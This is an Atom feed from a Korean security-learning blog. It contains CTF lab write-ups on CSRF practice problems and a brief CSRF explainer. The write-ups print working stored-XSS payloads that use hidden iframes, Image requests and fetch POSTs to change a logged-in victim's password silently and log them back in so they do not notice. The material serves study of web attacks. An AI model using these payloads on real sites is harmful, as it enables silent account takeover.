<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-23T13:19:16+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IERPTSBCYXNlZCBYU1Mg7Leo7JW97KCQIO2OmOydtOyngCDssL7quLAuXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjrpbwg64u07J2AIFVSTCDrp4zrk6wuXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTOydhCDrs7TrgrTslrQg7YG066at7ZWY64-E66GdIOycoOuPhO2VnOuLpC5cbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDogVVJMIO2BtOumrVxu7IKs7Jqp7J6QIC0-PiDsm7kg7ISc67KEIDog7Y6Y7J207KeAIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog66-47JmE7ISxIO2OmOydtOyngCDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7Y6Y7J207KeAIOuPmeyggeycvOuhnCDsmYTshLFcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuCDsi6TtlolcbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">CSRF 실습 1</title><link href="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B51/" rel="alternate" type="text/html" title="CSRF 실습 1" /><published>2023-05-23T00:00:00+09:00</published><updated>2021-05-23T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B51</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B51/"><![CDATA[<h2 id="csrf-실습-1번-문제">CSRF 실습 1번 문제</h2>
<ul>
  <li><strong>csrf 공격</strong>을 이용하여 계정의 비밀번호를 바꿔야한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c98520c7-9094-4710-a7f4-ed2bebd17d88" alt="Pasted image 20230522191000" /></li>
</ul>

<h2 id="취약점-찾기">취약점 찾기</h2>

<h3 id="게시판-xss-취약점--stored-xss-취약점-">게시판 XSS 취약점 ( Stored XSS 취약점 )</h3>
<ul>
  <li>게시판 제목과 게시판 본문에 클라이언트 스크립트가 삽입된다.</li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">alert</code> 스크립트 코드를 이용하여 취약점 확인이 가능하다.</p>
  </li>
  <li>
    <p>게시판 제목<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/928e3995-ef07-45a4-9cea-d420b2dbf74f" alt="Pasted image 20230522205649" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ec5356a7-0f25-4d09-9c2d-c9b00f27c5c2" alt="Pasted image 20230522205704" /></p>
  </li>
  <li>본문<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f9fddf28-eba9-44e0-9be3-666c478f7c93" alt="Pasted image 20230522205555" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d5f87e21-aebc-4f53-bde8-37fcd48b46ed" alt="Pasted image 20230522205622" /></li>
</ul>

<h3 id="비밀번호-변경-요청--csrf-취약점-">비밀번호 변경 요청 ( CSRF 취약점 )</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">burp suite</code> 를 통해 POST 로 비밀번호 변경 요청을 보내는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7adae6a0-98ee-47e4-9a76-bb2703d428d5" alt="Pasted image 20230522205846" /></li>
  <li>POST 방식에서 GET 방식으로 바꾸어 요청을 보내도 비밀번호가 변경되는 것을 확인할 수 있다.  로그인 한 상태에서 아래의 링크에 접속하면 비밀번호가 성공적으로 2222로 바뀐다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222
</code></pre></div></div>

<ul>
  <li>GET 을 통한 비밀번호 변경<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6e4840aa-91c9-461e-baa6-35a4ef7e0730" alt="Pasted image 20230522210844" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8d226f78-21e1-4750-822b-948174332578" alt="Pasted image 20230522210619" /></li>
  <li>즉 URL 링크에 로그인한 사용자 브라우저에서 접속하게 된다면 사용자 몰래 비밀번호 변경이 가능하다.</li>
</ul>

<h3 id="로그인">로그인</h3>
<ul>
  <li>post 요청으로만 로그인을 할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/09e59aea-5fa1-4aee-a10d-306c196de303" alt="Pasted image 20230522225144" /></li>
</ul>

<h2 id="공격-시나리오">공격 시나리오</h2>
<h3 id="url-클릭-유도하기">URL 클릭 유도하기</h3>
<ul>
  <li>crsf 취약점이 있는 비밀번호 변경 url을 이용한다.</li>
  <li>공격자가 비밀번호 변경 url 을 만들어 사용자에게 보내 클릭하도록 유도한다.</li>
  <li>하지만 이러한 공격을 성공시킬려면 사용자가 로그인을 한 상태에서 공격자에게서 받은 링크에 접속하여야 한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>비밀번호 2222로 변경하기
http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222
</code></pre></div></div>

<h3 id="xss--csrf-취약점-합쳐서-공격하기">XSS + CSRF 취약점 합쳐서 공격하기</h3>
<h4 id="최종-목표">최종 목표</h4>
<ul>
  <li>사용자가 게시글을 열람하면 사용자의 비밀번호가 공격자가 설정한 비밀번호로 즉시 변경된다. 단 사용자는 비밀번호 변경이 일어났는지 알아서는 안된다.</li>
</ul>

<h4 id="현재-서버-비밀번호-변경시-발생되는-일--예측-">현재 서버 비밀번호 변경시 발생되는 일 ( 예측 )</h4>
<ol>
  <li>정상적으로 비밀번호 변경을 요청하면 비밀번호가 사용자가 입력한 값으로 바뀐다.</li>
  <li>현재 로그인 중인 세션 값은 만료가 되어 로그아웃이 된다.</li>
  <li>다시 로그인 하기 위하여 로그인 페이지로 넘어간다.</li>
</ol>

<h4 id="공격-시나리오-1">공격 시나리오</h4>
<ol>
  <li>공격자는 악의적인 스크립트가 들어간 게시글을 작성한다.</li>
  <li>사용자가 로그인 하여 게시글을 살펴본다.</li>
  <li>사용자는 공격자가 작성한 게시글을 클릭하여 게시글 페이지에 들어간다.</li>
  <li>게시글 페이지에 들어가면 악의적인 스크립트에 의해 사용자의 비밀번호가 공격자가 설정한 비밀번호로 변경된다.</li>
</ol>

<h4 id="공격-스크립트-작성">공격 스크립트 작성</h4>

<h5 id="마이페이지를-통해-아이디-가져오기">마이페이지를 통해 아이디 가져오기</h5>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3c459cd1-2d95-4cbb-9e2c-c9c013ec1fe7" alt="Pasted image 20230523003251" /></p>

<ul>
  <li>마이페이지를 통해 사용자 아이디 찾기.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span>  <span class="na">onload=</span><span class="s">"get_id()"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/mypage.php"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">get_id</span><span class="p">(){</span>
	<span class="nx">id</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">placeholder</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h5 id="비밀번호-변경-스크립트">비밀번호 변경 스크립트</h5>
<ul>
  <li>img 태그의 src 부분을 이용하였다.</li>
  <li>게시글 방문만 하면 바로 비밀번호가 변경된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222</span><span class="dl">"</span><span class="p">;</span>
<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="nx">url</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h5 id="다시-공격자가-설정한-비밀번호로-다시-로그인하기">다시 공격자가 설정한 비밀번호로 다시 로그인하기.</h5>
<ul>
  <li>세션 값을 못 쓰게되어 자동으로 로그아웃이 된다. 따라서 iframe을 통해 다시 로그인하여 사용자는 로그아웃 없이 계속 페이지를 이용하는 것 처럼 느낄 수 있다.</li>
  <li>
    <p>다시 로그인을 해주면 세션 값이 새로운 값으로 바뀌게 된다.</p>
  </li>
  <li>로그인 화면 표시.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/login.php"</span> <span class="na">onload=</span><span class="s">"change()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<ul>
  <li>아이디 및 비밀번호 입력 &amp; 로그인 하기</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">change</span><span class="p">(){</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-id</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">id</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-pw</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pw</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h5 id="최종-공격-스크립트">최종 공격 스크립트</h5>
<ul>
  <li>가장 먼저 마이페이지에서 아이디를 가지고 온다.</li>
  <li>그런 다음 비밀번호를 변경하여준다.</li>
  <li>마지막으로 바뀐 비밀번호로 다시 로그인해준다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/mypage.php"</span> <span class="na">onload=</span><span class="s">"get_id()"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/iframe&gt;</span>
<span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/login.php"</span> <span class="na">onload=</span><span class="s">"change()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">pw</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">1234</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">function</span> <span class="nf">get_id</span><span class="p">(){</span>
	<span class="nx">id</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">placeholder</span><span class="p">;</span>
	
	<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=</span><span class="dl">"</span><span class="o">+</span><span class="nx">pw</span><span class="p">;</span>
<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="nx">url</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">change</span><span class="p">(){</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-id</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">id</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-pw</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pw</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h4 id="공격시작">공격시작</h4>
<ol>
  <li>완성된 스크립트를 이용하여 게시글을 작성한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/089f4135-01d5-4fc3-9ea5-12a8d5e5f65d" alt="Pasted image 20230523022549" /></li>
  <li>게시글을 저장해준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/40c9edbf-9fa2-4377-91b8-7cd6e8af08a5" alt="Pasted image 20230523005809" /></li>
  <li>사용자가 게시글을 방문하게 되면 비밀번호가 스크립트에서 설정한 <code class="language-plaintext highlighter-rouge">1234</code>로 변경된다. 서버에서는 자동으로 세션 값이 만료 시킨다. 로그인이 필요하지만 사용자는 정상적으로 게시글에 방문한 것 처럼 느끼게 된다. 왜냐하면 바뀐 비밀번호로 로그인을 하여 세션 값을 서버로부터 받기 때문이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/01194217-8ab1-4b51-9a2b-1ba16c4c51dc" alt="Pasted image 20230523023818" /></li>
</ol>

<h2 id="결론">결론</h2>
<ul>
  <li>iframe 과 서로 쿠키 값을 공유하기 때문에 가능한 방법이었다.</li>
  <li>사용자는 정상적으로 게시글을 확인한 것 처럼 느낄것이다. 하지만 사용자는 로그아웃 하고 다시 로그인 할 때 비밀번호가 변경되었다는 것을 알 수 있다.</li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 실습 1번 문제를 풀어보자.]]></summary></entry><entry><title type="html">CSRF 실습 2</title><link href="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B52/" rel="alternate" type="text/html" title="CSRF 실습 2" /><published>2023-05-23T00:00:00+09:00</published><updated>2021-05-23T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B52</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B52/"><![CDATA[<h2 id="csrf-실습-2번-문제-설">CSRF 실습 2번 문제 설</h2>
<ul>
  <li>CSRF 1번 문제와 비슷하게 계정의 비밀번호를 변경하는 문제이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e73d2fca-6932-4692-b5bb-527d33c09b2f" alt="Pasted image 20230523031645" /></li>
</ul>

<h2 id="서버-분석-및-취약점-찾기">서버 분석 및 취약점 찾기</h2>

<h3 id="비밀번호-변경-요청">비밀번호 변경 요청</h3>
<ul>
  <li>오직 POST 요청으로만 비밀번호를 변경할 수 있다.</li>
</ul>

<h3 id="게시글--stored-xss-">게시글 ( Stored XSS )</h3>
<ul>
  <li>게시글 제목과 게시글 본문에 XSS 취약점이 존재한다.</li>
  <li>POC 코드 <code class="language-plaintext highlighter-rouge">alert(1)</code> 을 통해 확인이 가능하다.</li>
  <li>게시글 제목<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/14ea3881-b828-4647-9e7d-7c7e7599e65b" alt="Pasted image 20230523125242" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/74654dbd-7f59-40c7-9efd-a90a09ff0474" alt="Pasted image 20230523125304" /></li>
  <li>게시글 본문<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/55f3ac55-414b-4586-9216-90b486174bef" alt="Pasted image 20230523125334" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/780e58ae-1d6b-4801-b0a7-70bfb49d052a" alt="Pasted image 20230523125351" /></li>
  <li>script 태그 부분의 내용은 게시글에서 안보인다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4fb232eb-2d4d-4883-9d73-81ef936569bd" alt="Pasted image 20230523125414" /></li>
</ul>

<h3 id="비밀번호-변경">비밀번호 변경</h3>
<ul>
  <li>비밀번호 변경을 한 후 <code class="language-plaintext highlighter-rouge">location.href</code> 를 통해 클라이언트 측에서 로그아웃 요청을 서버로 보낸다.</li>
  <li>즉 서버에서는 클라이언트 측에서 로그아웃 신호를 보내주기 전 까지는 세션을 만료 시키지 않는다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">'</span><span class="s1">index.php?session=true</span><span class="dl">'</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="공격-시나리오">공격 시나리오</h2>

<h3 id="xss게시판--csrf비밀번호-변경-요청-취약점-이용하기">XSS(게시판) + CSRF(비밀번호 변경 요청) 취약점 이용하기.</h3>

<h4 id="최종-목표">최종 목표</h4>
<ul>
  <li>사용자자 공격자가 작성한 게시글에 방문하면 사용자도 모르게 자동으로 비밀번호가 바뀐다. 하지만 사용자는 정상적으로 게시글을 방문한 것 처럼 느낀다. 즉 사용자는 로그아웃 하고 다시 로그인할 때 까지 비밀번호가 변경되었다는 것을 알아차리기 힘들다.</li>
</ul>

<h4 id="비밀번호-변경-요청-동작-방식--예측-">비밀번호 변경 요청 동작 방식 ( 예측 )</h4>
<ol>
  <li>POST 요청으로 사용자가 입력한 비밀번호를 전송하여 변경한다.</li>
  <li>사용자는 응답으로 로그아웃을 하라는 링크를 받는다.</li>
  <li>사용자는 서버로 로그아웃 요청을 보내어 로그아웃을 진행한다.</li>
</ol>

<ul>
  <li>비밀번호 변경 POST 요청<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8adbbd7e-51cf-448e-9da7-d3b4e5ebb87b" alt="Pasted image 20230523124958" /></li>
</ul>

<h4 id="시나리오">시나리오</h4>
<ol>
  <li>공격자는 악성 스크립트가 담긴 게시글을 작성한다.</li>
  <li>사용자는 로그인하여 공격자의 게시글을 확인한다.</li>
  <li>사용자가 공격자의 게시글에 방문하면 악성 스크립트가 동작하여 사용자의 비밀번호를 공격자가 설정한 비밀번호로 변경한다.</li>
  <li>비밀번호가 변경 되었어도 사용자가 서버로 로그아웃 요청을 보내지 않아 계속 서비스를 이용할 수 있다.</li>
</ol>

<h4 id="공격-스크립트">공격 스크립트</h4>

<h5 id="스크립트로-post-요청-보내기">스크립트로 POST 요청 보내기</h5>
<ul>
  <li>fetch 함수를 이용하였다.</li>
  <li>fetch를 이용하여 post 요청을 보내면 응답으로 <code class="language-plaintext highlighter-rouge">location.href</code> 을 받지만 실행되지 않아 자동으로 로그아웃 되는 것을 방지할 수 있다. ( 세션 만료 방지 )</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">mypage_update.php</span><span class="dl">"</span><span class="p">,{</span>
	<span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
	<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
		<span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
	<span class="p">},</span>
	<span class="na">body</span><span class="p">:</span> <span class="dl">"</span><span class="s2">id=&amp;info=&amp;pw=2222</span><span class="dl">"</span>
<span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h5 id="최종-공격-스크립트">최종 공격 스크립트</h5>
<ul>
  <li>자동으로 비밀번호 변경 요청을 서버로 보내게 된다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">mypage_update.php</span><span class="dl">"</span><span class="p">,{</span>
	<span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
	<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
		<span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
	<span class="p">},</span>
	<span class="na">body</span><span class="p">:</span> <span class="dl">"</span><span class="s2">id=&amp;info=&amp;pw=2222</span><span class="dl">"</span>
<span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h4 id="공격시작">공격시작</h4>
<ol>
  <li>공격자는 악성 스크립트가 담긴 게시글 작성한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a955160b-60a8-4575-bd87-548d119377ee" alt="Pasted image 20230523125941" /></li>
  <li>게시글을 저장해준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/391c5b4b-caba-43fe-a73c-46d69b1768ad" alt="Pasted image 20230523130032" /></li>
  <li>사용자가 공격자가 작성한 게시글에 방문하게 되면 자동으로 비밀번호가 바뀌게 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6154015a-65cc-4da4-88af-ed3e60b24fa6" alt="Pasted image 20230523130148" /></li>
</ol>

<h2 id="결론">결론</h2>
<ul>
  <li>Javascript의 fetch 함수를 이용하여 POST 요청을 서버에 보내고 응답을 받아온다.</li>
  <li>사용자는 일반적인 게시글을 방문한 것 처럼 느끼게 된다. 하지만 실제로는 게시글 방문과 동시에 비밀번호 요청이 가는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b90ae746-4800-4425-99a2-ba2a32be7fff" alt="Pasted image 20230523130254" /></li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://www.daleseo.com/js-window-fetch/">자바스크립트의 fetch() 함수로 원격 API 호출하기</a></li>
  <li><a href="https://velog.io/@seoltang/fetch-POST-Request">fetch 함수: POST Request (velog.io)</a></li>
  <li><a href="https://sisiblog.tistory.com/261">자바스크립트 fetch로 formdata post 보내기 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 실습 2번 문제를 풀어보자.]]></summary></entry><entry><title type="html">CSRF 간단한 정리</title><link href="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="CSRF 간단한 정리" /><published>2023-05-21T00:00:00+09:00</published><updated>2021-05-20T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="csrf--cross-site-request-forgery--란">CSRF ( Cross Site Request Forgery ) 란</h2>
<ul>
  <li>요청을 위조하는 공격이다.</li>
  <li>피해자가 몰랐던 요청을 서버에 보내게 하는 공격이다.</li>
  <li>피해자는 자신의 의도와는 다르게, 서버로 임이의 요청을 하게 만드는 공격이다.</li>
  <li>피해자 세션을 활용한 공격이다.</li>
</ul>

<h2 id="발생-위치">발생 위치</h2>
<ul>
  <li>모든 요청에서 발생할 수 있다.</li>
  <li>비밀번호 변경, 이메일 주소 변경, 관리자 계정 등록 등.</li>
</ul>

<h2 id="중요">중요</h2>
<ul>
  <li>단 피해자가 로그인을 한 채로 링크를 클릭해야 피해자 세션 정보로 요청이 보내진다.</li>
</ul>

<h2 id="공격-방법">공격 방법</h2>

<h3 id="get-방식일-때">GET 방식일 때</h3>
<ul>
  <li>CSRF 공격이 쉬워진다.</li>
  <li>요청을 주는 url을 만들어 사용자에게 주어 클릭하도록 만들어주면 된다.</li>
</ul>

<h3 id="post-방식일-때">POST 방식일 때</h3>
<ol>
  <li>가장 간단한 방법은 사용자가 클릭하게 유도하는 방법.</li>
  <li>XSS 취약점과 CSRF 취약점을 합쳐서 공격하는 방법. 단 같은 도메인에서 두개(xss, csrf)의 취약점이 나타나야 한다.</li>
</ol>

<ul>
  <li>iframe 을 이용하여 form post 결과를 iframe 에서 볼 수 있게 만든다. 이러면 페이지 이동은 없으면서 사용자는 자신도 모르게 요청을 보내게 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe width="0" height="0" border="0" name="frame" id="frame" style="display:none;"&gt;&lt;/iframe&gt;


&lt;form method="POST" action="xxx" target="frame"&gt;
	&lt;input&gt;
